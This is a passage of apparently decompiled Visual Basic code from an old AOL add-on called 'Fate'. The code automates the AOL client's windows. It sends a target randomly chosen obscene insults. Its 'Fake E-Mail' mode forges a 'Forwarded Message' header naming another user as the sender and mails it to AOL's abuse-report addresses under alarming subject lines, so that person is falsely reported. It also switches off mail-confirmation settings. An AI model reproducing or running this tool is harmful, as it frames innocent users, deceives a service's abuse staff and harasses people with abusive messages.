l01C6 = "I am going to punt your ass... "
End Select
Randomize
l01CA = Int(5 * Rnd)
Select Case l01CA
Case 0
l01CE = "so don't fuck with me.."
Case 1
l01CE = " ..get a fucking life moron!"
Case 2
l01CE = "...mother fucker"
Case 3
l01CE = "..cock licker"
Case 4
l01CE = "..vagina licker...."
Case 5
l01CE = "...go fuck Steve Case!"
End Select
l01A2 = l01BE + l01C6 + l01CE
l019E = extfn11A0(l019A, 12, 0, text1.Text + ":" + Chr(9) + l01A2)
l01A2 = extfn10F8(l015A, "Send")
l01A6 = fn1480(l01A2)
150 :
DoEvents
l01AA = extfn1018("#32770", "America Online")
If  l01AA = 0 Then GoTo 150
l01AE = extfn10F8(l01AA, "OK")
l01B2 = fn1480(l01AE)
If  Combo1.Text = "All Methods" Then GoTo 160
l017A = extfnFE0(l011A, 16, 0, 0)
l01B6 = extfnFE0(l014A, 16, 0, 0)
GoTo L473BA
End If
If  Combo1.Text = "Fake E-Mail" Then
160 :
l017A = extfnFE0(l011A, 16, 0, 0)
l01B6 = extfnFE0(l014A, 16, 0, 0)
l01D2 = 0
l018A = extfn1018("AOL FRAME25", 0&)
l018E = extfn10F8(l018A, "Welcome")
l01D6$ = String(30, 0)
l0196 = extfnFA8(l018E, l01D6$, 250)
If  l0196 <= 7 Then
MsgBox "An error occurred: Not Signed On!", 16
Exit Sub
End If
l0116 = extfn1018("AOL FRAME25", 0&)
If  fn138() = 0 Then
MsgBox "Fate could not detect your version of America Online. Please Re-run America Online in order for Fate to work.", 16
Exit Sub
End If
If  fn138() = 5 Then
l0120 = fn5D0("Mem&bers", "Set Preferences")
Else
l0120 = fn5D0("Mem&bers", "Preferences")
End If
15 :
DoEvents
l0124 = extfn10F8(l0116, "Preferences")
If  l0124 = 0 Then GoTo 15
l0128 = extfn10F8(l0124, "Mail")
l012E = extfn1168(l0128, 2)
l0132 = extfnFE0(l012E, &H201, 0, 0)
l0138 = extfnFE0(l012E, &H202, 0, 0)
25 :
DoEvents
l011A = extfn1018("_AOL_MODAL", 0&)
If  l011A = 0 Then GoTo 25
l013C = extfnFE0(l0124, 16, 0, 0)
l0142 = extfn10F8(l011A, "Confirm mail")
l0146 = extfn1168(l0142, 2)
l014A = extfnFE0(l0146, 1025, 0, 0&)
l014E = extfn10F8(l011A, "Close mail")
l0152 = extfn1168(l014E, 3)
l0156 = extfnFE0(l0152, 1025, 1, 0&)
l015A = extfn10F8(l011A, "OK")
l015E = extfnFE0(l015A, &H201, 0, 0)
l0162 = extfnFE0(l015A, &H202, 0, 0)
l0166 = extfn1130(l0116)
l0116 = extfn1018("AOL FRAME25", 0&)
l01BA = extfn10F8(l0116, "Welcome, ")
l01DC$ = String(250, 0)
l01C2 = extfnFA8(l01BA, l01DC$, 250)
l01DE = Mid(l01DC$, 10, 10)
l01C6 = InStr(l01DE, "!")
If  l01C6 Then
l01DE = Mid(l01DE, 1, l01C6 - 1)
End If
l0120 = extfn10C0(l0116, "AOL TOOLBAR")
l0124 = extfn10C0(l0120, "_AOL_ICON")
l0128 = extfn1168(l0124, 2)
l012E = fn1480(l0128)
DoEvents
l01E2 = Time$
l01E6 = Date$

11 :
DoEvents
l0124 = extfn10F8(l0116, "Compose Mail")
If  l0124 = 0 Then GoTo 11
l01EA = Date
l01EE = InStr(l01EA, "/")
l01F2 = Mid(l01EA, l01EE + 1, Len(l01EA))
l01F6 = InStr(l01F2, "/")
l01FA = Mid(l01F2, l01F6 + 1, Len(l01F2))
l01FE = Mid(l01EA, 1, l01EE - 1)
l0202 = Mid(l01F2, 1, l01F6 - 1)
If  Len(l0202) = 1 Then
l0202 = "0" + Trim(Str(l0202))
End If
l0206 = l01FA + "-" + l01FE + "-" + l0202
l0128 = extfn10F8(l0124, "To:")
l012E = extfn1168(l0128, 2)
l0132 = extfn11A0(l012E, 12, 0, "TOSEmail2")
l0138 = extfn10F8(l0124, "Subject:")
l011A = extfn1168(l0138, 2)
Randomize
l020A = Int(22 * Rnd)
Select Case l020A
Case 0
l020E = "Attention: Your Account"
Case 1
l020E = "Dear USER"
Case 2
l020E = "***ATTENTION AOL USER***"
Case 3
l020E = "Read: AOL USER"
Case 4
l020E = "Words From Steve Case - Founder of AOL"
Case 5
l020E = "AOL Problems"
Case 6
l020E = "America Online Bugs"
Case 7
l020E = "America Online News"
Case 8
l020E = "America Online FlashNews!"
Case 9
l020E = "A Letter Concerning On Your Account"
Case 10
l020E = "Something you need to Know"
Case 11
l020E = "Important News"
Case 12
l020E = "America Online News"
Case 13
l020E = "AOL Mail"
Case 14
l020E = "Letter From Steve Case"
Case 15
l020E = "AOL Update"
Case 16
l020E = "America Online: Your Account"
Case 17
l020E = "AOL Problems: Your Account"
Case 18
l020E = "Words Concerning On Your Account"
Case 19
l020E = "* Attention * Your Account"
Case 20
l020E = "Please Respond Back"
Case 21
l020E = "Respond Back - America Online"
End Select
l013C = extfn11A0(l011A, 12, 0, "Fwd: " + l020E)
l0142 = extfn1168(l0128, 1)
l0112 = Chr(13) + Chr(10)
l0146 = extfn11A0(l0142, 12, 0, "-----------------" + l0112 + "Forwarded Message:" + l0112 + "Subj:" + Chr(9) + l020E + l0112 + "Date:" + Chr(9) + l0206 + " " + l01E2 + " EDT" + l0112 + "From:" + Chr(9) + text1 + l0112 + "To:" + Chr(9) + l01DE + l0112 + l0112 + Text2.Text)
l014A = extfn10F8(l0124, "Send")
l014E = extfn1168(l014A, 2)
l0152 = extfnFE0(l014E, &H201, 0, 0)
l0156 = extfnFE0(l014E, &H202, 0, 0)
34 :
DoEvents
l015A = extfn1018("#32770", "America Online")
l0212 = extfn10F8(l0116, "Error")
If  l0212 > 0 Then
l0216 = extfn10F8(l0212, "OK")
l021A = fn1480(l0216)
If  l01D2 = 1 Then
l01D2 = 0
l0128 = extfn10F8(l0124, "To:")
l012E = extfn1168(l0128, 2)
l0132 = extfn11A0(l012E, 12, 0, "TOSGeneral")
l019E = fn1480(l014E)
End If
l0128 = extfn10F8(l0124, "To:")
l012E = extfn1168(l0128, 2)
l0132 = extfn11A0(l012E, 12, 0, "TOSEmail2")
l019E = fn1480(l014E)
l01D2 = 1
End If
If  l015A = 0 Then GoTo 34
l015E = extfn10F8(l015A, "OK")
l0162 = extfn1130(l015E)
l0166 = extfnFE0(l0162, &H201, 0, 0)
l016A = extfnFE0(l0162, &H202, 0, 0)
l016E = extfnFE0(l0124, 16, 0, 0)
GoTo L473BA
End If
L473BA:
Timer1.Interval = 0
Timer1.Enabled = False
End Sub

Sub sub9980 ()
Unload tos
End Sub
